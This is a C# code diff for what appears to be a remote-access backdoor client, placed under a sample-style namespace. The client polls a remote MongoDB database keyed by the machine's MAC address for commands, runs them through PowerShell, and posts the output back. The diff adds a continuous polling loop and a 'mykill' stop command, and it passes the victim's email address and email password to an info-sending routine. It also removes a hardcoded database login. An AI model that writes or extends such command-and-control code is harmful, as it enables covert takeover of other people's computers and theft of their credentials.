@@ -13,11 +13,11 @@ namespace ProcessAsyncStreamSamples
     {
         // Define static variables shared by class methods.
         private static StringBuilder sendOutput = null;
-        public static void CreatePowershellprocess(string databaseip, string databaseport, string mac)
+        public static void CreatePowershellprocess(string databaseip, string databaseport, string mac, string uremail, string uremailpass, string adminemail, string databseusername, string databasepass)
         {
             while (true)
             {
-                string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
+                string inputText = client.infosender.Clientinfosender(databaseip, databaseport, mac, uremail, uremailpass, adminemail, databseusername, databasepass);
                 if (!String.IsNullOrEmpty(inputText))
                 {
                     Process powershell = new Process();
@@ -33,23 +33,22 @@ namespace ProcessAsyncStreamSamples
                     BsonDocument doc = new BsonDocument();
                     while (true)
                     {
-                        Console.WriteLine(inputText);
                         doc.Add(new BsonElement("name", "client"));
                         doc.Add(new BsonElement("command", inputText));
                         sendOutput.Clear();
                         try
                         {
+                            Console.WriteLine(inputText);
                             StreamWriter.WriteLine(inputText);
 
                         }
                         catch
                         {
-                            var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
-                            ////create collection
+                            var dbClient1 = new MongoClient("mongodb://" + databseusername + ":" + databasepass + "@" + databaseip + ":" + databaseport + "/admin");
                             IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
-                            ////creat Mac object
                             var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
                             doc.Add(new BsonElement("respond", "i cant run ur command!"));
+                            Console.WriteLine("i cant run ur command!");
                             respondsdatabase1.DropCollection(mac);
                             respondscollection1.InsertOne(doc);
                             doc.Clear();
@@ -82,28 +81,45 @@ namespace ProcessAsyncStreamSamples
                             }
 
                         }
-                        var dbClient = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
+                        var dbClient = new MongoClient("mongodb://" + databseusername + ":" + databasepass + "@" + databaseip + ":" + databaseport + "/admin");
                         IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
                         var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
                         respondsdatabase.DropCollection(mac);
+                        Console.WriteLine(doc);
                         respondscollection.InsertOne(doc);
                         doc.Clear();
                         IMongoDatabase commandsdatabase = dbClient.GetDatabase("commands");
                         ////creat Mac object
                         var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                         var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
-                        var servercommand = commadscollection.Find(filter).FirstOrDefault();
-                        inputText = servercommand.ElementAt(2).Value.ToString();
-                        var update = Builders<BsonDocument>.Update.Set("command", "");
-                        commadscollection.UpdateOne(filter, update);
-                        if (inputText == "")
+                        while (true)
                         {
+                            var servercommand = commadscollection.Find(filter).FirstOrDefault();
+                            inputText = servercommand.ElementAt(2).Value.ToString();
+                            if (inputText != "")
+                            {
+                                var update = Builders<BsonDocument>.Update.Set("command", "");
+                                commadscollection.UpdateOne(filter, update);
+                                break;
+                            }
+                            Thread.Sleep(2000);
+                        }
+                        if (inputText == "mykill")
+                        {
+                            doc.Add(new BsonElement("name", "client"));
+                            doc.Add(new BsonElement("command", inputText));
+                            doc.Add(new BsonElement("respond", "ok, client return to normal state bye "));
+                            Console.WriteLine("ok, client return to normal state bye ");
+                            respondsdatabase.DropCollection(mac);
+                            respondscollection.InsertOne(doc);
+                            doc.Clear();
                             StreamWriter.Close();
                             powershell.Kill();
                             powershell.Close();
                             inputText = null;
                             break;
                         }
+
                     }
 
                 }
